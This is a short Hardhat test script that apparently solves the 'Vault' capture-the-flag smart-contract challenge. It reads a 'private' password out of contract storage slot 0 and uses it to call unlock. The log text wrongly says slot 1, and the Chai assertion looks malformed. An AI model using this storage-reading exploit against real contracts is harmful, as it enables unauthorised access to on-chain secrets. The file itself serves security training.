const { expect } = require("chai");
const { ethers } = require("hardhat");
const path = require("path");
const { isTypedArray } = require("util/types");
const util = require("../utils.js");

var scriptName = path.basename(__filename);

const CHALLENGE_ADDRESS = "0x02D13626fD6c3152d2AEe4441c09B65B127776B5";
describe("Vault", () => {
  beforeEach(async () => {
    const accounts = await hre.ethers.getSigners();
    deployer = accounts[0];
    hacker = accounts[1];
    const factory = await ethers.getContractFactory("Vault");
    contract = factory.attach(CHALLENGE_ADDRESS);
  });

  it("initiates hack", async () => {
    console.log("initiating hack!");
    console.log("getting storage at slot 1");
    const pw = await ethers.provider.getStorageAt(contract.address, 0);
    console.log(pw);
    await contract.unlock(pw);
    expect(await contract.locked()).to.eq.false();
    console.log("Hacked!!");
    util.updateTotalSolved(scriptName);
  });
});
